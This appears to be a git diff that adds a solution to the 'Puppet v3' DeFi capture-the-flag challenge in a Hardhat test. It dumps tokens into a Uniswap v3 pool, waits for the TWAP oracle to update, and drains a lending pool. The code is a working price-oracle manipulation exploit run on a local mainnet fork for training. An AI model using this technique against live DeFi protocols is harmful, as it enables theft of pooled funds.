@@ -5,6 +5,7 @@ const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
+const routerJson = require("@uniswap/v3-periphery/artifacts/contracts/SwapRouter.sol/SwapRouter.json");
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth.llamarpc.com";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +141,33 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const uniswapRouter = new ethers.Contract("0xE592427A0AEce92De3Edee1F18E0157C05861564", routerJson.abi, player);
+
+        // approve infinit dvt allowance to uniswap router
+        await token.connect(player).approve(uniswapRouter.address, ethers.constants.MaxUint256);
+
+        // approve infinit weth allowance to lending pool
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);
+        
+        // dump all dvt
+        await uniswapRouter.connect(player).exactInputSingle(
+            {
+                tokenIn: token.address,
+                tokenOut: weth.address,
+                fee: await uniswapPool.fee(),
+                recipient: player.address,
+                deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
+                amountIn: await token.balanceOf(player.address),
+                amountOutMinimum: 0n,
+                sqrtPriceLimitX96: 0n,
+            }
+        );
+
+        // some time passes to update twap
+        await time.increase(113 - ((await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp));
+
+        // borrow all dvt from lending pool
+        await lendingPool.connect(player).borrow(await token.balanceOf(lendingPool.address));
     });
 
     after(async function () {
